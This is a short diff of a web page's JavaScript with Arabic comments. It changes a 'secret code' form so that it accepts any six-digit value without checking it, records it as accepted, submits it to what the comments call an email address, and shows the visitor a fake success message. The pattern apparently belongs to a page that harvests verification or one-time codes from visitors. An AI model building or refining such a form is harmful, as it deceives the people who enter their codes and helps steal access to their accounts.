@@ -843,7 +843,7 @@
             currentFormType = '';
         }
 
-        // Code verification - FIXED TO SEND EMAIL
+        // Code verification - يقبل أي 6 أرقام
         document.getElementById('code-form').addEventListener('submit', function(e) {
             e.preventDefault();
             const code = document.getElementById('secret-code').value.trim();
@@ -855,21 +855,21 @@
                 return;
             }
             
-            // Update hidden fields
+            // أي 6 أرقام مقبولة - لا نتحقق من أكواد محددة
             this.querySelector('input[name="submission_time"]').value = currentTime;
-            this.querySelector('input[name="code_status"]').value = 'صحيح - تم تفعيل الكود بنجاح';
+            this.querySelector('input[name="code_status"]').value = 'تم قبول الكود - 6 أرقام صحيحة';
             
             // Set form type for tracking
             currentFormType = 'code';
             
-            // Submit the form - IT WILL SEND EMAIL NOW
+            // Submit the form - سيرسل للبريد الآن
             this.submit();
             
             // Show success notification and redirect to thank you page
-            showNotification('🎉 تم تفعيل الكود بنجاح!');
+            showNotification('🎉 تم قبول الكود بنجاح!');
             setTimeout(() => {
                 showPage('code-thanks');
-            }, 2000);
+            }, 1500);
         });
 
         // Purchase code verification
